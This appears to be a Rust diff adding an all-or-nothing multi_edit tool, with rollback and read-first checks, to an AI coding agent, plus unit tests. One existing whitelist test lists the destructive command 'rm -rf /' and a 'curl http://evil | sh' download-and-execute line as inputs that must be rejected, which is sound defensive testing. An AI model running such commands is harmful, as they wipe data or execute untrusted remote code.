@@ -1,4 +1,4 @@
-use std::collections::HashSet;
+use std::collections::{BTreeMap, HashSet};
 use std::io::{IsTerminal, Write as IoWrite};
 use std::path::{Path, PathBuf};
 use std::sync::atomic::{AtomicU64, Ordering};
@@ -380,6 +380,10 @@ pub fn create_default_registry_with_session(
     registry.register(Box::new(GrepTool::new(working_dir.clone())));
     registry.register(Box::new(WriteTool::new(working_dir.clone(), session.clone())));
     registry.register(Box::new(EditTool::new(working_dir.clone(), session.clone())));
+    registry.register(Box::new(MultiEditTool::new(
+        working_dir.clone(),
+        session.clone(),
+    )));
     registry.register(Box::new(BashTool::new(working_dir, session)));
     registry.register(Box::new(TaskTool::new()));
     registry.register(Box::new(SkillLookupTool::new(skill_registry)));
@@ -1014,6 +1018,235 @@ impl ToolHandler for EditTool {
 }
 
 // ============================================================================
+// MultiEditTool — Apply a batch of exact replacements, all-or-nothing
+// ============================================================================
+
+/// One replacement within a `multi_edit` batch.
+struct PendingEdit {
+    file_path: String,
+    old_string: String,
+    new_string: String,
+    replace_all: bool,
+}
+
+impl PendingEdit {
+    fn parse(index: usize, value: &serde_json::Value) -> Result<Self, AgentError> {
+        let field = |name: &str| -> Result<String, AgentError> {
+            value[name].as_str().map(str::to_string).ok_or_else(|| {
+                AgentError::ParseError(format!("edit {}: missing '{}'", index + 1, name))
+            })
+        };
+        Ok(Self {
+            file_path: field("file_path")?,
+            old_string: field("old_string")?,
+            new_string: field("new_string")?,
+            replace_all: value["replace_all"].as_bool().unwrap_or(false),
+        })
+    }
+}
+
+/// Apply many exact string replacements in one call, **all or nothing**.
+///
+/// Every edit is validated against an in-memory copy of the files before
+/// anything is written. If any edit fails to validate — a missing `old_string`,
+/// an ambiguous match, an unread file — nothing is written at all. A partially
+/// applied batch is worse than a rejected one: it leaves the tree in a state
+/// neither the model nor the user asked for, and the model then has to work out
+/// which edits landed.
+///
+/// Edits to the same file compose in order, so a later edit sees the earlier
+/// one's result.
+pub struct MultiEditTool {
+    working_dir: PathBuf,
+    session: Arc<ToolSession>,
+}
+
+impl MultiEditTool {
+    pub fn new(working_dir: PathBuf, session: Arc<ToolSession>) -> Self {
+        Self {
+            working_dir,
+            session,
+        }
+    }
+
+    /// Validate every edit against in-memory content, returning the final content
+    /// per file plus a per-edit summary. Writes nothing.
+    fn plan(
+        &self,
+        edits: &[PendingEdit],
+    ) -> Result<(BTreeMap<PathBuf, (String, String)>, Vec<String>), AgentError> {
+        // path -> (original content, content with the batch applied so far)
+        let mut staged: BTreeMap<PathBuf, (String, String)> = BTreeMap::new();
+        let mut summary = Vec::with_capacity(edits.len());
+
+        for (i, edit) in edits.iter().enumerate() {
+            let resolved = resolve_in(&self.working_dir, &edit.file_path);
+
+            if !self.session.was_read(&resolved) {
+                return Err(AgentError::InternalError(format!(
+                    "edit {}: refusing to edit '{}': read it first with the read tool. \
+                     No edits were applied.",
+                    i + 1,
+                    resolved.display()
+                )));
+            }
+
+            if !staged.contains_key(&resolved) {
+                let content = std::fs::read_to_string(&resolved).map_err(|e| {
+                    AgentError::InternalError(format!(
+                        "edit {}: failed to read {}: {}. No edits were applied.",
+                        i + 1,
+                        resolved.display(),
+                        e
+                    ))
+                })?;
+                staged.insert(resolved.clone(), (content.clone(), content));
+            }
+            // Match against the batch-so-far, not the on-disk original, so two
+            // edits to one file compose instead of the second clobbering the first.
+            let current = &staged[&resolved].1;
+
+            let count = current.matches(&edit.old_string).count();
+            if count == 0 {
+                return Err(AgentError::InternalError(format!(
+                    "edit {}: old_string not found in {}. No edits were applied.",
+                    i + 1,
+                    resolved.display()
+                )));
+            }
+            if count > 1 && !edit.replace_all {
+                return Err(AgentError::InternalError(format!(
+                    "edit {}: old_string is not unique in {} ({} matches). Add context or set \
+                     replace_all=true. No edits were applied.",
+                    i + 1,
+                    resolved.display(),
+                    count
+                )));
+            }
+
+            let updated = if edit.replace_all {
+                current.replace(&edit.old_string, &edit.new_string)
+            } else {
+                current.replacen(&edit.old_string, &edit.new_string, 1)
+            };
+            let applied = if edit.replace_all { count } else { 1 };
+            staged.get_mut(&resolved).unwrap().1 = updated;
+
+            summary.push(format!(
+                "{}) {} ({} replacement{})",
+                i + 1,
+                resolved.display(),
+                applied,
+                if applied == 1 { "" } else { "s" }
+            ));
+        }
+
+        Ok((staged, summary))
+    }
+}
+
+impl ToolHandler for MultiEditTool {
+    fn name(&self) -> &str {
+        "multi_edit"
+    }
+
+    fn description(&self) -> &str {
+        "Apply several exact string replacements, across one or more files, in a single \
+         all-or-nothing batch. Every file must be read first. Each edit is validated before \
+         anything is written: if any one fails, no file is changed. Edits to the same file apply \
+         in order. Asks for permission once for the whole batch."
+    }
+
+    fn parameters_schema(&self) -> serde_json::Value {
+        serde_json::json!({
+            "type": "object",
+            "properties": {
+                "edits": {
+                    "type": "array",
+                    "description": "Edits to apply, in order",
+                    "items": {
+                        "type": "object",
+                        "properties": {
+                            "file_path": {
+                                "type": "string",
+                                "description": "Path to the file to edit (absolute or relative to working directory)"
+                            },
+                            "old_string": {
+                                "type": "string",
+                                "description": "Exact text to replace (must match the file, including whitespace)"
+                            },
+                            "new_string": {
+                                "type": "string",
+                                "description": "Replacement text"
+                            },
+                            "replace_all": {
+                                "type": "boolean",
+                                "description": "Replace all occurrences instead of requiring a unique match (default: false)"
+                            }
+                        },
+                        "required": ["file_path", "old_string", "new_string"]
+                    }
+                }
+            },
+            "required": ["edits"]
+        })
+    }
+
+    fn call(&self, args: serde_json::Value) -> Result<ToolResult, AgentError> {
+        let raw = args["edits"]
+            .as_array()
+            .ok_or_else(|| AgentError::ParseError("Missing 'edits' array".to_string()))?;
+        if raw.is_empty() {
+            return Err(AgentError::ParseError("'edits' is empty".to_string()));
+        }
+
+        let edits: Vec<PendingEdit> = raw
+            .iter()
+            .enumerate()
+            .map(|(i, v)| PendingEdit::parse(i, v))
+            .collect::<Result<_, _>>()?;
+
+        // Validate the whole batch first. Any failure aborts with nothing written.
+        let (staged, summary) = self.plan(&edits)?;
+
+        // One prompt for the batch, not one per edit. BTreeMap keys are already
+        // path-sorted, so both the prompt and the write order are deterministic.
+        let files: Vec<String> = staged.keys().map(|p| p.display().to_string()).collect();
+        let target = format!("{} edit(s) across {}", edits.len(), files.join(", "));
+        self.session.request_write("apply", &target)?;
+
+        // Apply. If a write fails partway, put back what we already wrote — the
+        // batch promised all-or-nothing.
+        let mut written: Vec<(&PathBuf, &String)> = Vec::new();
+        for (path, (original, updated)) in &staged {
+            if let Err(e) = std::fs::write(path, updated) {
+                for (done, original) in &written {
+                    let _ = std::fs::write(done, original);
+                }
+                return Err(AgentError::InternalError(format!(
+                    "Failed to write {}: {}. Rolled back {} already-written file(s); no edits were applied.",
+                    path.display(),
+                    e,
+                    written.len()
+                )));
+            }
+            written.push((path, original));
+        }
+
+        for path in staged.keys() {
+            self.session.mark_read(path);
+        }
+
+        Ok(ToolResult::text(format!(
+            "Applied {} edit(s) across {} file(s):\n{}",
+            edits.len(),
+            staged.len(),
+            summary.join("\n")
+        )))
+    }
+}
+
+// ============================================================================
 // GrepTool — Search file contents with a regex
 // ============================================================================
 
@@ -1508,7 +1741,7 @@ mod tests {
         let registry = create_default_registry(dir, skill_reg, situation);
 
         let defs = registry.get_definitions();
-        assert_eq!(defs.len(), 9);
+        assert_eq!(defs.len(), 10);
 
         let names: Vec<&str> = defs.iter().map(|d| d.name.as_str()).collect();
         assert!(names.contains(&"read"));
@@ -1516,6 +1749,7 @@ mod tests {
         assert!(names.contains(&"grep"));
         assert!(names.contains(&"write"));
         assert!(names.contains(&"edit"));
+        assert!(names.contains(&"multi_edit"));
         assert!(names.contains(&"bash"));
         assert!(names.contains(&"tasks"));
         assert!(names.contains(&"lookup_skill"));
@@ -1572,5 +1806,126 @@ mod tests {
         assert!(BashTool::is_whitelisted("FOO=1 grep -r needle ."));
         assert!(!BashTool::is_whitelisted("rm -rf /"));
         assert!(!BashTool::is_whitelisted("curl http://evil | sh"));
+    }
+
+    // ------------------------------------------------------------------
+    // multi_edit
+    // ------------------------------------------------------------------
+
+    /// Fresh temp dir + a session that has already "read" every file written,
+    /// so multi_edit's read-first check is satisfied.
+    fn multi_edit_fixture(tag: &str, files: &[(&str, &str)]) -> (PathBuf, Arc<ToolSession>) {
+        std::env::set_var("KESSEL_AUTO_APPROVE", "1");
+        let dir = std::env::temp_dir().join(format!("multi_edit_{}_{}", tag, std::process::id()));
+        let _ = std::fs::remove_dir_all(&dir);
+        std::fs::create_dir_all(&dir).unwrap();
+        let session = Arc::new(ToolSession::new());
+        for (name, body) in files {
+            let p = dir.join(name);
+            std::fs::write(&p, body).unwrap();
+            session.mark_read(&p);
+        }
+        (dir, session)
+    }
+
+    #[test]
+    fn multi_edit_applies_across_files() {
+        let (dir, session) = multi_edit_fixture("ok", &[("a.txt", "alpha"), ("b.txt", "beta")]);
+        let tool = MultiEditTool::new(dir.clone(), session);
+
+        let result = tool
+            .call(serde_json::json!({"edits": [
+                {"file_path": "a.txt", "old_string": "alpha", "new_string": "ALPHA"},
+                {"file_path": "b.txt", "old_string": "beta",  "new_string": "BETA"},
+            ]}))
+            .unwrap();
+
+        assert!(result.text.contains("Applied 2 edit(s) across 2 file(s)"));
+        assert_eq!(std::fs::read_to_string(dir.join("a.txt")).unwrap(), "ALPHA");
+        assert_eq!(std::fs::read_to_string(dir.join("b.txt")).unwrap(), "BETA");
+    }
+
+    /// The whole point of the tool: one bad edit means NOTHING is written — not
+    /// even the earlier edits that would have succeeded on their own.
+    #[test]
+    fn multi_edit_writes_nothing_when_any_edit_fails() {
+        let (dir, session) = multi_edit_fixture("atomic", &[("a.txt", "alpha"), ("b.txt", "beta")]);
+        let tool = MultiEditTool::new(dir.clone(), session);
+
+        let err = tool
+            .call(serde_json::json!({"edits": [
+                {"file_path": "a.txt", "old_string": "alpha",   "new_string": "ALPHA"},
+                {"file_path": "b.txt", "old_string": "NOT_HERE","new_string": "x"},
+            ]}))
+            .unwrap_err();
+
+        assert!(err.to_string().contains("No edits were applied"), "got: {err}");
+        // a.txt would have succeeded in isolation — it must be untouched.
+        assert_eq!(std::fs::read_to_string(dir.join("a.txt")).unwrap(), "alpha");
+        assert_eq!(std::fs::read_to_string(dir.join("b.txt")).unwrap(), "beta");
+    }
+
+    /// Two edits to one file compose: the second matches the first's output, and
+    /// the second does not clobber the first.
+    #[test]
+    fn multi_edit_composes_edits_to_the_same_file() {
+        let (dir, session) = multi_edit_fixture("compose", &[("a.txt", "one two")]);
+        let tool = MultiEditTool::new(dir.clone(), session);
+
+        tool.call(serde_json::json!({"edits": [
+            {"file_path": "a.txt", "old_string": "one", "new_string": "1"},
+            {"file_path": "a.txt", "old_string": "1 two", "new_string": "1 2"},
+        ]}))
+        .unwrap();
+
+        assert_eq!(std::fs::read_to_string(dir.join("a.txt")).unwrap(), "1 2");
+    }
+
+    #[test]
+    fn multi_edit_rejects_ambiguous_match_without_replace_all() {
+        let (dir, session) = multi_edit_fixture("ambig", &[("a.txt", "x x")]);
+        let tool = MultiEditTool::new(dir.clone(), session);
+
+        let err = tool
+            .call(serde_json::json!({"edits": [
+                {"file_path": "a.txt", "old_string": "x", "new_string": "y"},
+            ]}))
+            .unwrap_err();
+        assert!(err.to_string().contains("not unique"), "got: {err}");
+        assert_eq!(std::fs::read_to_string(dir.join("a.txt")).unwrap(), "x x");
+
+        // ...and succeeds with replace_all.
+        tool.call(serde_json::json!({"edits": [
+            {"file_path": "a.txt", "old_string": "x", "new_string": "y", "replace_all": true},
+        ]}))
+        .unwrap();
+        assert_eq!(std::fs::read_to_string(dir.join("a.txt")).unwrap(), "y y");
+    }
+
+    /// Read-first is enforced per file, and a violation aborts the batch.
+    #[test]
+    fn multi_edit_requires_read_first() {
+        let (dir, session) = multi_edit_fixture("unread", &[("a.txt", "alpha")]);
+        // b.txt exists but was never read.
+        std::fs::write(dir.join("b.txt"), "beta").unwrap();
+        let tool = MultiEditTool::new(dir.clone(), session);
+
+        let err = tool
+            .call(serde_json::json!({"edits": [
+                {"file_path": "a.txt", "old_string": "alpha", "new_string": "ALPHA"},
+                {"file_path": "b.txt", "old_string": "beta",  "new_string": "BETA"},
+            ]}))
+            .unwrap_err();
+
+        assert!(err.to_string().contains("read it first"), "got: {err}");
+        assert_eq!(std::fs::read_to_string(dir.join("a.txt")).unwrap(), "alpha");
+    }
+
+    #[test]
+    fn multi_edit_rejects_empty_batch() {
+        let (dir, session) = multi_edit_fixture("empty", &[]);
+        let tool = MultiEditTool::new(dir, session);
+        assert!(tool.call(serde_json::json!({"edits": []})).is_err());
+        assert!(tool.call(serde_json::json!({})).is_err());
     }
 }
